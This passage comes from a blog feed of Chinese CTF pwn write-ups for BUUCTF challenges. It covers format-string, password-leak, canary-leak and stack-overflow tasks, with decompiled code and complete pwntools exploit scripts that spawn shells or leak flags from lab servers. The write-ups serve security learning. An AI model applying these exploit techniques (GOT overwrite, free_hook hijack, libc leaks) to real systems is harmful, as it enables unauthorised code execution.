punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>edit_db<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>heap<span class="token punctuation">)</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>free_hook <span class="token operator">-</span> <span class="token number">0x88</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x88</span><span class="token punctuation">)</span>add_db<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x90</span><span class="token punctuation">)</span>add_db<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x88</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>add_db<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span>delete_db<span class="token punctuation">(</span><span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> heap </tag>
            
            <tag> oob </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf刷题（持续更新）</title>
      <link href="/2023/07/20/buuctf-shua-ti-chi-xu-geng-xin/buuctf-shua-ti-chi-xu-geng-xin/"/>
      <url>/2023/07/20/buuctf-shua-ti-chi-xu-geng-xin/buuctf-shua-ti-chi-xu-geng-xin/</url>
      
        <content type="html"><![CDATA[<p>（写了七十几题之后开始写这篇博客，前面的不想补啦</p><h2 id="wdb-2018-2nd-easyfmt"><a href="#wdb-2018-2nd-easyfmt" class="headerlink" title="wdb_2018_2nd_easyfmt"></a><a href="https://buuoj.cn/challenges#wdb_2018_2nd_easyfmt">wdb_2018_2nd_easyfmt</a></h2><p>看题目名字就是格式化字符串的题，先检查保护，32位没开任何保护</p><pre class="line-numbers language-none"><code class="language-none">➜  wdb_2018_2nd_easyfmt checksec pwn[*] &#39;&#x2F;home&#x2F;starrysky&#x2F;buuctf&#x2F;wdb_2018_2nd_easyfmt&#x2F;pwn&#39;    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8047000)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>再反编译看是否是栈上的格式化字符串</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">int __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123;  char buf[100]; &#x2F;&#x2F; [esp+8h] [ebp-70h] BYREF  unsigned int v4; &#x2F;&#x2F; [esp+6Ch] [ebp-Ch]  v4 &#x3D; __readgsdword(0x14u);  setbuf(stdin, 0);  setbuf(stdout, 0);  setbuf(stderr, 0);  puts(&quot;Do you know repeater?&quot;);  while ( 1 )  &#123;    read(0, buf, 0x64u);    printf(buf);    putchar(10);  &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>确认是栈上的格式化字符串，基本思路就是泄露<code>libc</code>基址，然后改<code>prinitf</code>为<code>system</code></p><p>exp如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'i386'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">26003</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">b'%35$p'</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Do you know repeater?\n'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>libc_start_main <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0xf7</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.23.so'</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> libc_start_main <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">]</span>printf <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'printf'</span><span class="token punctuation">]</span>system <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_basesys1 <span class="token operator">=</span> system <span class="token operator">&amp;</span> <span class="token number">0xff</span>sys2 <span class="token operator">=</span> system <span class="token operator">>></span> <span class="token number">8</span> <span class="token operator">&amp;</span> <span class="token number">0xffff</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x20</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>printf<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>printf <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p<span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">'%'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>sys1<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%14$hhn'</span> <span class="token operator">+</span> <span class="token string">'%'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token punctuation">(</span>sys2<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span>sys1<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%15$hn'</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="picoctf-2018-leak-me"><a href="#picoctf-2018-leak-me" class="headerlink" title="picoctf_2018_leak_me"></a><a href="https://buuoj.cn/challenges#picoctf_2018_leak_me">picoctf_2018_leak_me</a></h2><p>检查保护</p><pre class="line-numbers language-none"><code class="language-none">➜  picoctf_2018_leak_me checksec pwn[*] &#39;&#x2F;home&#x2F;starrysky&#x2F;buuctf&#x2F;picoctf_2018_leak_me&#x2F;pwn&#39;    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>反编译出的主要部分如下</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">puts(&quot;What is your name?&quot;);  fgets(v5, 0x100, stdin);  v8 &#x3D; strchr(v5, &#39;\n&#39;);  if ( v8 )    *v8 &#x3D; &#39;\0&#39;;  strcat(v5, &quot;,\nPlease Enter the Password.&quot;);  stream &#x3D; fopen(&quot;password.txt&quot;, &quot;r&quot;);  if ( !stream )  &#123;    puts(      &quot;Password File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.&quot;);    exit(0);  &#125;  fgets(s, 0x40, stream);  printf(&quot;Hello &quot;);  puts(v5);  fgets(s1, 0x40, stdin);  v5[0] &#x3D; 0;  if ( !strcmp(s1, s) )    ((void (__cdecl *)(int *))flag)(p_argc);  else    puts(&quot;Incorrect Password!&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>先创建一个<code>flag.txt</code>和<code>password.txt</code>,然后输入<code>0x100</code>个<code>a</code>，结果直接输出了<code>password</code></p><pre class="line-numbers language-none"><code class="language-none">➜  picoctf_2018_leak_me .&#x2F;pwnWhat is your name?aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaHello aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,bbbIncorrect Password!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>那就直接打远程，先拿到<code>password</code>然后直接拿到<code>flag</code></p><pre class="line-numbers language-none"><code class="language-none">➜  picoctf_2018_leak_me nc node4.buuoj.cn 29296What is your name?aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaHello aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,a_reAllY_s3cuRe_p4s$word_f85406a_reAllY_s3cuRe_p4s$word_f85406flag&#123;f22f5647-b8c8-42e2-b854-f0b8cc9b4399&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输入<code>0x100</code>个<code>a</code>会直接报错，所以少输几个也能泄露<code>password</code>,再输入就去就行了</p><h2 id="wdb2018-guess"><a href="#wdb2018-guess" class="headerlink" title="wdb2018_guess"></a><a href="https://buuoj.cn/challenges#wdb2018_guess">wdb2018_guess</a></h2><p>检查保护，开了<code>canary</code></p><pre class="line-numbers language-none"><code class="language-none">➜  wdb2018_guess checksec pwn[*] &#39;&#x2F;home&#x2F;starrysky&#x2F;buuctf&#x2F;wdb2018_guess&#x2F;pwn&#39;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x3fe000)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>反汇编</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">v10 &#x3D; __readfsqword(0x28u);v7 &#x3D; 3LL;LODWORD(stat_loc.__uptr) &#x3D; 0;v6 &#x3D; 0LL;sub_4009A6(a1, a2, a3);HIDWORD(stat_loc.__iptr) &#x3D; open(&quot;.&#x2F;flag.txt&quot;, 0);if ( HIDWORD(stat_loc.__iptr) &#x3D;&#x3D; -1 )&#123;  perror(&quot;.&#x2F;flag.txt&quot;);  _exit(-1);&#125;read(SHIDWORD(stat_loc.__iptr), buf, 48uLL);close(SHIDWORD(stat_loc.__iptr));puts(&quot;This is GUESS FLAG CHALLENGE!&quot;);while ( 1 )&#123;  if ( v6 &gt;&#x3D; v7 )  &#123;    puts(&quot;you have no sense... bye :-) &quot;);    return 0LL;  &#125;  if ( !(unsigned int)sub_400A11() )    break;  ++v6;  wait((__WAIT_STATUS)&amp;stat_loc);&#125;puts(&quot;Please type your guessing flag&quot;);gets(s2);if ( !strcmp(buf, s2) )  puts(&quot;You must have great six sense!!!! :-o &quot;);else  puts(&quot;You should take more effort to get six sence, and one more challenge!!&quot;);return 0LL;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>程序的功能就是判断输入的<code>flag</code>，在<code>gets</code>处可溢出但没有输出，因此需要利用<code>canary</code>的报错来泄露内存</p><p>在低版本的<code>glibc</code>中触发<code>canary</code>保护会输出<code>__libc_argv[0]</code>,因此需要利用溢出来覆盖它使得泄露<code>flag</code></p><pre class="line-numbers language-C" data-language="C"><code class="language-C">void__attribute__ ((noreturn)) internal_function__fortify_fail (const char *msg)&#123;  &#x2F;* The loop is added only to keep gcc happy.  *&#x2F;  while (1)    __libc_message (2, &quot;*** %s ***: %s terminated\n&quot;,    msg, __libc_argv[0] ?: &quot;&lt;unknown&gt;&quot;);&#125;libc_hidden_def (__fortify_fail)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以解题思路就是覆盖<code>__libc_argv[0]</code>为<code>flag</code>的地址，计算<code>flag</code>的地址可以通过泄露<code>libc</code>中存储栈地址的一个变量<code>environ</code>，而<code>environ</code>的地址可以通过<code>libc</code>计算得到，所以要先通过泄露<code>puts_got</code>来得到<code>libc_base</code></p><p>exp如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">28010</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x128</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Please type your guessing flag'</span><span class="token punctuation">,</span> p1<span class="token punctuation">)</span>puts_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'libc-2.23.so'</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> puts_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>environ_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__environ'</span><span class="token punctuation">]</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x128</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>environ_addr<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Please type your guessing flag'</span><span class="token punctuation">,</span> p2<span class="token punctuation">)</span>stack_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>flag_addr <span class="token operator">=</span> stack_addr <span class="token operator">-</span> <span class="token number">0x168</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x128</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>flag_addr<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Please type your guessing flag'</span><span class="token punctuation">,</span> p3<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="cmcc-pwnme2"><a href="#cmcc-pwnme2" class="headerlink" title="cmcc_pwnme2"></a><a href="https://buuoj.cn/challenges#cmcc_pwnme2">cmcc_pwnme2</a></h2><p>检查保护</p><pre class="line-numbers language-none"><code class="language-none">➜  cmcc_pwnme2 checksec pwn[*] &#39;&#x2F;home&#x2F;starrysky&#x2F;buuctf&#x2F;cmcc_pwnme2&#x2F;pwn&#39;    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>程序中存在栈溢出</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">int __cdecl main(int argc, const char **argv, const char **envp)&#123;  char s[132]; &#x2F;&#x2F; [esp+0h] [ebp-88h] BYREF  string &#x3D; 0;  fflush(stdout);  puts(&quot;Welcome&quot;);  puts(&quot;Please input:&quot;);  fflush(stdout);  gets(s);  userfunction(s);  return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-C" data-language="C"><code class="language-C">int __cdecl userfunction(char *src)&#123;  char dest[108]; &#x2F;&#x2F; [esp+Ch] [ebp-6Ch] BYREF  strcpy(dest, src);  return printf(&quot;Hello, %s\n&quot;, src);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-C" data-language="C"><code class="language-C">int exec_string()&#123;  char s; &#x2F;&#x2F; [esp+Bh] [ebp-Dh] BYREF  FILE *stream; &#x2F;&#x2F; [esp+Ch] [ebp-Ch]  stream &#x3D; fopen(&amp;string, &quot;r&quot;);  if ( !stream )    perror(&quot;Wrong file&quot;);  fgets(&amp;s, 50, stream);  puts(&amp;s);  fflush(stdout);  return fclose(stream);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-C" data-language="C"><code class="language-C">char *__cdecl add_home(int a1)&#123;  char *result; &#x2F;&#x2F; eax  if ( a1 &#x3D;&#x3D; 0xDEADBEEF )  &#123;    result &#x3D; (char *)(strlen(&amp;string) + 0x804A060);    strcpy(result, &quot;&#x2F;home&quot;);  &#125;  return result;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-C" data-language="C"><code class="language-C">char *__cdecl add_flag(int a1, int a2)&#123;  char *result; &#x2F;&#x2F; eax  if ( a1 &#x3D;&#x3D; 0xCAFEBABE &amp;&amp; a2 &#x3D;&#x3D; 0xABADF00D )  &#123;    result &#x3D; (char *)(strlen(&amp;string) + 0x804A060);    strcpy(result, &quot;&#x2F;.flag1&quot;);  &#125;  return result;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>题目本意是调用<code>add_home</code> 和<code>add_flag</code>向<code>string</code>直接输入文件名之后调用<code>exec_string</code>读出<code>flag</code>，但是<code>buu</code>远程的文件名和程序里的不一样，所以可以直接读入<code>flag.txt</code></p><p>exp如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'i386'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">29781</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>exec_string <span class="token operator">=</span> <span class="token number">0x80485CB</span>string <span class="token operator">=</span> <span class="token number">0x804A060</span>gets <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'gets'</span><span class="token punctuation">]</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x6c</span> <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>gets<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>exec_string<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>string<span class="token punctuation">)</span>r<span class="token 